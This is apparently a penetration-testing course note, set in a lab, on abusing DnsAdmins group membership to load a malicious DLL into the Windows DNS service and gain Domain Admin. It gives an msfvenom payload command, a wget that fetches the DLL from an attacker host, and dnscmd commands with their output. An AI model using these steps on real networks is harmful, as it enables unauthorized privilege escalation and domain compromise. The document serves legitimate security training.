# DnsAdmins

this group have access to DNS information on the network and since the DNS service runs as `NT AUTHORITY\SYSTEM` we could potentially escalate privilege on DC.

the following attack can be performed when DNS is run on a Domain Controller (which is very common):

* DNS management is performed over RPC
* [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with **zero verification** of the DLL's path. This can be done with the `dnscmd` tool from the command line
* When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
* When the DNS service is restarted, the **DLL in this path will be loaded** (i.e., a network share that the Domain Controller's machine account can access)
* An **attacker can load a custom DLL to obtain a reverse shell** or even load a tool such as Mimikatz as a DLL to dump credentials.

### Leveraging DnsAdmins Access

**Generating Malicious DLL**

to add a user to the `domain admins` group using `msfvenom`.

```shell-session
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

**Starting Local HTTP Server**

```shell-session
carbonlky@htb[/htb]$ python3 -m http.server 7777
```

**Downloading File to Target**

```powershell-session
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

**Loading DLL as Non-Privileged User (Will ERROR)**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

**Loading DLL as Member of DnsAdmins**

```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
```

**Loading Custom DLL**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

{% hint style="info" %}
specify the full path to our custom DLL or the attack will not work properly.
{% endhint %}

**Finding User's SID**

